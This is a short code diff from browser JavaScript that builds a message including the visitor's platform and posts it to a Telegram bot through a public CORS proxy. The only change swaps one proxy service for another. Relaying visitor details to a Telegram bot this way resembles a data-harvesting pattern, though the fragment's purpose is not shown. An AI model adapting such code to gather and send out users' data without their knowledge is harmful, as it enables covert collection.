@@ -18,7 +18,7 @@
         text += 'Platform: ' + navigator.platform;
         
         var apiUrl = 'https://api.telegram.org/bot' + BOT + '/sendMessage';
-        var proxyUrl = 'https://corsproxy.io/?' + encodeURIComponent(apiUrl);
+        var proxyUrl = 'https://api.allorigins.win/raw?url=' + encodeURIComponent(apiUrl);
         
         fetch(proxyUrl, {
             method: 'POST',
